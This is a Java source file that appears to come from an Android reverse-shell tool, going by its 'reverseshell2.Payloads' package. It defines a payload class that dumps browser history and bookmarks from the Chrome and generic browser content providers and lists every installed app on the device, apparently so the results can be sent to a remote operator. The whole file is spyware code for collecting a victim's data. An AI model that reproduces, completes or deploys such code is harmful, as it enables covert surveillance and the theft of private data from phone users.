package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Browser;
import android.util.Log;

import java.util.List;

public class BrowserHistoryDumper {

    private static final String TAG = "BrowserHistoryDumper";
    private Context context;

    public BrowserHistoryDumper(Context context) {
        this.context = context;
    }

    public String dumpBrowserHistory() {
        StringBuilder result = new StringBuilder();
        result.append("=== BROWSER HISTORY DUMP ===\n");
        
        // Try Chrome bookmarks/history via ContentProvider
        try {
            Uri uri = Uri.parse("content://com.android.chrome.browser/bookmarks");
            Cursor cursor = context.getContentResolver().query(uri, 
                null, null, null, "date DESC");
            if (cursor != null) {
                result.append("\n--- Chrome History ---\n");
                while (cursor.moveToNext()) {
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        result.append(cursor.getColumnName(i)).append(": ");
                        result.append(cursor.getString(i)).append("\n");
                    }
                    result.append("---\n");
                }
                cursor.close();
            }
        } catch (Exception e) {
            result.append("Chrome history: Access restricted (").append(e.getMessage()).append(")\n");
        }

        // Try generic browser content provider 
        try {
            Uri uri = Uri.parse("content://browser/bookmarks");
            Cursor cursor = context.getContentResolver().query(uri, 
                new String[]{"title", "url", "date", "visits"}, 
                null, null, "date DESC");
            if (cursor != null) {
                result.append("\n--- Browser Bookmarks ---\n");
                while (cursor.moveToNext()) {
                    String title = cursor.getString(0);
                    String url = cursor.getString(1);
                    String date = cursor.getString(2);
                    String visits = cursor.getString(3);
                    result.append(title).append(" | ").append(url);
                    if (visits != null) result.append(" (").append(visits).append(" visits)");
                    result.append("\n");
                }
                cursor.close();
            }
        } catch (Exception e) {
            result.append("Browser bookmarks: Access restricted\n");
        }

        return result.toString();
    }

    public String dumpInstalledApps() {
        StringBuilder result = new StringBuilder();
        try {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            
            result.append("=== INSTALLED APPS ===\n");
            result.append("Total: ").append(packages.size()).append("\n");
            result.append("---\n");

            for (ApplicationInfo appInfo : packages) {
                String appName = pm.getApplicationLabel(appInfo).toString();
                String packageName = appInfo.packageName;
                boolean isSystem = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                String type = isSystem ? "[SYS]" : "[USR]";
                result.append(type).append(" ").append(appName).append(" (").append(packageName).append(")\n");
            }
        } catch (Exception e) {
            result.append("ERROR: ").append(e.getMessage()).append("\n");
        }
        return result.toString();
    }
}
